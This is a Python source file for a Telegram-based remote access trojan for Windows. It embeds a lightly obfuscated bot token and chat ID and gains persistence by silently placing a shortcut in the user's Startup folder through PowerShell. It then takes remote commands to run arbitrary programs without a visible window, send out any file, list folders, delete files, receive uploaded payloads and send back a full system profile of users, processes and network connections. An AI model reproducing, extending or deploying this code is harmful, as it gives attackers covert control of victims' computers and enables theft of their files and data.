import asyncio
import os.path
import pathlib
import time
import datetime
import psutil
import subprocess
import sys
from telegram import Bot, Update
from telegram.ext import ApplicationBuilder, filters, ContextTypes, CommandHandler, MessageHandler

ID = '6017928969'
CHAT_ID = '8409240133742905816679'
CHAT_ID = CHAT_ID.strip('16679')
CHAT_ID = CHAT_ID.strip('8409240')
TOKEN = ID + ':AAETgWRfU1AD2Ww8Z' + 'qeUK6g6lCZm_OeRq1Y'
DOWNLOAD_FOLDER_PATH = os.path.expanduser('~')
LOG_FILE = os.path.join(os.path.expanduser('~'), f'{os.path.basename(os.path.expanduser("~"))}-System Info')


class Psutil:
    @staticmethod
    def memory_info():
        try:
            ram = psutil.virtual_memory()
        except Exception as e:
            return f'Error getting memory stats\n\t{e}'
        ram_info = f'Total Memory: {ram[0]} ({float("{:.4f}".format(ram[0] / 1073741824))} GB)\n' \
                   f'Available Memory: {ram[1]} ({float("{:.4f}".format(ram[1] / 1073741824))} GB)\n' \
                   f'Used Memory: {ram[3]} ({float("{:.4f}".format(ram[3] / 1073741824))} GB)\n' \
                   f'Percentage Used: {ram[2]}%\n'
        swap_mem = psutil.swap_memory()
        swap_mem_info = f'Total Swap Memory: {swap_mem[0]} ({float("{:.4f}".format(swap_mem[0] / 1073741824))} GB)\n' \
                        f'Free Swap Memory: {swap_mem[2]} ({float("{:.4f}".format(swap_mem[2] / 1073741824))} GB)\n' \
                        f'Used Swap Memory: {swap_mem[1]} ({float("{:.4f}".format(swap_mem[1] / 1073741824))} GB)\n' \
                        f'Percentage Used: {swap_mem[3]}%\n' \
                        f'sin: {swap_mem[4]}\nsout: {swap_mem[5]}'

        return ram_info + swap_mem_info

    @staticmethod
    def disk_info():
        disks_info = []
        try:
            disks = psutil.disk_partitions()
            for disk in disks:
                usage_info = []
                try:
                    usage = psutil.disk_usage(disk[0])
                    usage_info = [f'Total Space = {usage[0]} / ({float("{:.4f}".format(usage[0] / 1073741824))} GB)',
                                  f'Used Space = {usage[1]} / ({float("{:.4f}".format(usage[1] / 1073741824))} GB)',
                                  f'Free Space = {usage[2]} / ({float("{:.4f}".format(usage[2] / 1073741824))} GB)',
                                  f'Percent Used = {usage[3]}%']
                except:
                    pass
                disk_information = [f'Device = {disk[0]}', f'Mount Point = {disk[1]}', f'File System = {disk[2]}',
                                    f'{usage_info[0]}', f'{usage_info[1]}', f'{usage_info[2]}', f'{usage_info[3]}',
                                    f'Mount Options = {disk[3]}', f'Max File Length = {disk[4]}',
                                    f'Max Path Length = {disk[5]}\n']
                disks_info.append(disk_information)
        except:
            pass

        return disks_info

    @staticmethod
    def net_connections():
        try:
            connections = psutil.net_connections()
            return connections
        except:
            pass

    @staticmethod
    def nic_addresses():
        try:
            addresses = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            return addresses, stats
        except:
            pass

    @staticmethod
    def boot_time():
        try:
            return datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        except:
            pass

    @staticmethod
    def get_users():
        try:
            return psutil.users()
        except:
            pass

    @staticmethod
    def get_processes():
        try:
            processes = []
            for proc in psutil.process_iter():
                processes.append(proc)
            return processes
        except:
            pass

    @staticmethod
    def log_system_stats():
        log_list = []
        line = '_______________________________________________________________________________________________________'

        def log(x):
            try:
                log_list.append(x)
            except:
                pass

        def log_to_file(info):
            try:
                with open(LOG_FILE, 'w', encoding='utf-8') as f:
                    for item in info:
                        f.write(f'{item}\n')
            except:
                pass

        log(f'\tUSER: {(os.path.basename(os.path.expanduser("~"))).upper()}')
        log(line)
        boot_log = Psutil.boot_time()
        log(f'System Boot Time = {boot_log}')
        log(line)
        log('\tAVAILABLE USERS')
        users_log = Psutil.get_users()
        for user in users_log:
            log(user)
        log(line)
        log('\tMEMORY STATS')
        memory_log = Psutil.memory_info()
        log(memory_log)
        log(line)
        log('\tDISK STATS')
        disks_log = Psutil.disk_info()
        for disk in disks_log:
            for item in disk:
                log(item)
        log(line)
        log('\tCONNECTIONS')
        connections_log = Psutil.net_connections()
        for conn in connections_log:
            log(conn)
        log(line)
        log('\tNICs INFO AND ADDRESSES')
        nic_log, stats_log = Psutil.nic_addresses()
        log('1. NIC Addresses')
        for key, values in nic_log.items():
            log('\n' + key)
            for item in values:
                log(item)
        log('\n2. NIC Stats\n')
        for keys, stats in stats_log.items():
            log(keys)
            log(stats)
            log('\n')
        log(line)
        log('\tPROCESSES')
        processes_log = Psutil.get_processes()
        for process in processes_log:
            log(process)
        log(line)
        log('\tEND OF SYSTEM STATS')

        # print(log_list)
        log_to_file(log_list)


def create_startup_shortcut(target_path, shortcut_path='', description='', working_dir='', icon_path='', icon_index=0):
    if shortcut_path == '':
        shortcut_path = os.path.join(os.path.dirname(target_path),
                                     os.path.basename(target_path).rsplit(".", maxsplit=1)[0] + ".lnk")

    startup_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows',
                                'Start Menu', 'Programs', 'Startup',
                                os.path.basename(target_path).rsplit(".", maxsplit=1)[0] + ".lnk")
    # The powershell command
    script = (
        "$WshShell = New-Object -ComObject WScript.Shell; "
        f"$Shortcut = $WShShell.CreateShortcut('{shortcut_path}'); "
        "$Shortcut.WindowStyle = 7; "  # 3=Maximized 4=Normal 7=Minimized
        f"$Shortcut.IconLocation = '{icon_path}, {icon_index}'; "
        f"$Shortcut.TargetPath = '{target_path}'; "
        f"$shortcut.Description = '{description}'; "
        f"$Shortcut.WorkingDirectory = '{working_dir}'; "
        "$Shortcut.Save()"
    )
    # Run the command
    try:
        subprocess.run(['powershell', '-command', script], shell=True)
    except:
        pass

    split_shortcut_path = os.path.basename(shortcut_path)

    script_2 = (
        f"$sourceFile = '{shortcut_path}'; "
        f"$splitSourceFile = '{split_shortcut_path}'; "
        "$startupFolder = [Environment]::GetFolderPath('Startup'); "
        f"$startupPath = Join-Path -Path $startupFolder -ChildPath $splitSourceFile; "
        f"Move-Item -Path $sourceFile -Destination $startupPath -Force"
    )

    if os.path.exists(shortcut_path):
        try:
            subprocess.run(['powershell', '-command', script_2], shell=True)
        except:
            pass
        if os.path.exists(startup_path):
            return True


# Telegram Module
async def commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text="Hello, this is a list of commands I can execute.\n"
                                            "1. Run->(file_path)\n"
                                            "2. Send->(file_path)\n"
                                            "3. Send system stats\n"
                                            "4. Cd->\n"
                                            "5. Delete\n"
                                            "6.\n")
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id, text='Error sending commands.')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text=f"Hello from {os.path.basename(os.path.expanduser('~'))}")
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id, text='Error sending menu.')


async def handle_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command_text = ' '.join(context.args)
    await handle_text(update, context, command_text)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE, text='') -> None:
    if text == '':
        text = update.message.text
    if text.startswith('Run->'):
        return_code = await subprocess.call([text.strip("Run->")], shell=True, stdin=None,
                                            stdout=None, stderr=None, close_fds=True,
                                            creationflags=subprocess.CREATE_NO_WINDOW)
        if not return_code:
            await context.bot.send_message(chat_id=update.effective_chat.id,
                                           text=f'Error executing file {text.strip("Run->")}')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id,
                                           text=f'{text.strip("Run->")} executed successfully')

    elif text.startswith('Send->'):
        await context.bot.send_document(chat_id=update.effective_chat.id,
                                        document=os.path.abspath(text.strip('Send->')))
    elif text == 'Send system stats':
        try:
            Psutil.log_system_stats()
        except:
            await context.bot.send_message(chat_id=update.effective_chat.id, text='Error getting system stats')
        await context.bot.send_document(chat_id=update.effective_chat.id, document=LOG_FILE)
        try:
            os.remove(LOG_FILE)
        except:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f'Error removing {LOG_FILE}')
    elif text.startswith('Cd->'):
        items = []
        for child in pathlib.Path(os.path.abspath(text.strip('Cd->'))).glob('*'):
            if child.is_file():
                items.append(f'{os.path.basename(child)}')
            else:
                items.append(f'{os.path.basename(child)}\t\t(Folder)')
        try:
            await context.bot.send_message(chat_id=update.effective_chat.id, text='\n\n'.join(items))
        except:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f'Error sending files list')

    elif text.startswith('Delete->'):
        try:
            os.remove(text.strip('Delete->'))
            await context.bot.send_message(chat_id=update.effective_chat.id,
                                           text=f'{text.strip("Delete->")} removed successfully')

        except:
            await context.bot.send_message(chat_id=update.effective_chat.id,
                                           text=f'Error removing {text.strip("Delete->")}. Try again.')

    else:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text=f"'{text}' is not one of my keywords!")


async def handle_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    new_file = await update.message.document.get_file()
    file_name = update.message.caption
    try:
        await new_file.download_to_drive(file_name)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f'{file_name} downloaded!')
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text=f'{file_name} not downloaded. Please resend.')


async def send_file(file, chat_id='') -> None:
    if chat_id == '':
        chat_id = CHAT_ID
    try:
        await Bot.send_document(chat_id=chat_id, document=open(file, 'rb'), filename=file)
    except:
        await Bot.send_message(chat_id=chat_id, text=f'{file} not found.')


async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text="You have sent a command I dont understand")
    except:
        pass


async def update():
    pass


def connected():
    import requests
    try:
        response = requests.get('http://www.google.com', timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def main() -> None:
    bot = ApplicationBuilder().token(TOKEN).build()

    # bot.post_init = send_start_message
    bot.add_handler(CommandHandler(f'{os.path.basename(os.path.expanduser("~"))}', handle_user))
    bot.add_handler(CommandHandler('start', start))
    bot.add_handler(CommandHandler('update', update))
    bot.add_handler(CommandHandler('commands', commands))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    bot.add_handler(MessageHandler(filters.Document.ALL, handle_files))

    bot.add_handler(MessageHandler(filters.COMMAND, unknown_command))  # Always last!!

    bot.run_polling()


if __name__ == '__main__':
    os.chdir(os.path.expanduser("~"))
    try:
        create_startup_shortcut(target_path=os.path.abspath(sys.argv[0]))
    except:
        pass

    while not connected():
        # print('No Internet. Retrying after 7s')
        time.sleep(3)
    main()
